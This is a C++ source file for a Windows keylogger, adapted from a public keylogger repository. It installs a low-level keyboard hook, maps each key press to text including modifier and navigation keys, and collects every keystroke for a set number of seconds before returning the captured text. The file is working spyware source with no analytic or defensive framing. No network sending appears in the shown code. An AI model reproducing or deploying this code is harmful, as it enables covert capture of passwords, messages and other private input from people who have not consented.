// Reference:
// https://github.com/GiacomoLaw/Keylogger/blob/master/windows/klog_main.cpp
#include "keylog.hpp"

std::wstring result;
HHOOK hHook;
HWND gh_hwndMain;
KBDLLHOOKSTRUCT kbdStruct;

const std::map<int, std::wstring> keyName{ 
	{VK_BACK,       L"[BACKSPACE]" },
	{VK_RETURN,	    L"\n" },
	{VK_SPACE,	    L" " },
	{VK_TAB,	    L"[TAB]" },
	{VK_SHIFT,	    L"" },              // {VK_SHIFT,	    L"[SHIFT]" },
	{VK_LSHIFT,	    L"" },              // {VK_LSHIFT,	    L"[LSHIFT]" },
	{VK_RSHIFT,	    L"" },              // {VK_RSHIFT,	    L"[RSHIFT]" },
	{VK_CONTROL,	L"[CONTROL]" },
	{VK_LCONTROL,	L"[LCONTROL]" },
	{VK_RCONTROL,	L"[RCONTROL]" },
	{VK_MENU,	    L"[ALT]" },
	{VK_LWIN,       L"[LWIN]" },
	{VK_RWIN,	    L"[RWIN]" },
	{VK_ESCAPE,	    L"[ESCAPE]" },
	{VK_END,	    L"[END]" },
	{VK_HOME,	    L"[HOME]" },
	{VK_LEFT,	    L"[LEFT]" },
	{VK_RIGHT,	    L"[RIGHT]" },
	{VK_UP,		    L"[UP]" },
	{VK_DOWN,	    L"[DOWN]" },
	{VK_PRIOR,	    L"[PG_UP]" },
	{VK_NEXT,	    L"[PG_DOWN]" },
	{VK_OEM_PERIOD,	L"." },
	{VK_DECIMAL,	L"." },
	{VK_OEM_PLUS,	L"+" },
	{VK_OEM_MINUS,	L"-" },
	{VK_ADD,		L"+" },
	{VK_SUBTRACT,	L"-" },
	{VK_CAPITAL,	L"[CAPSLOCK]" },
};

VOID SaveKey(DWORD dwKey)
{
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (keyName.find(dwKey) != keyName.end())
    {
        result += keyName.at(dwKey);
    }
    else
    {
        char cKey;

        // Check 'CapsLock' key
        bool bLowerCase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        // Check 'Shift' key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            bLowerCase = !bLowerCase;
        }

        cKey = MapVirtualKeyExW(dwKey, MAPVK_VK_TO_CHAR, layout);

        if (!bLowerCase)
        {
            cKey = tolower(cKey);
        }

        char cKey2 = char(cKey);

        std::string sKey{cKey2};
        result += UTF8Decode(sKey);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    CHAR szBuf[128];
    HDC hdc;
    static INT c = 0;
    size_t cch;
    HRESULT hResult;

    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            SaveKey(kbdStruct.vkCode);
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

std::wstring KeyLog(INT nLogTime)
{
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (!hHook)
	{
		return L"Error: Could not set the hook.";
	}

    // Keep running 'nLogTime' seconds.
    MSG msg;
    std::chrono::time_point start = std::chrono::steady_clock::now();
    // while (GetMessage(&msg, NULL, 0, 0))
    while (1==1)
    {
        PeekMessage(&msg, NULL, 0, 0, 0);

        if (std::chrono::steady_clock::now() - start > std::chrono::seconds(nLogTime))
        {
            break;
        }
    }
    UnhookWindowsHookEx(hHook);

    if (wcscmp(result.c_str(), L"") == 0)
    {
        result += std::wstring(L"Error: Could not keylog.");
    }
	return result;
}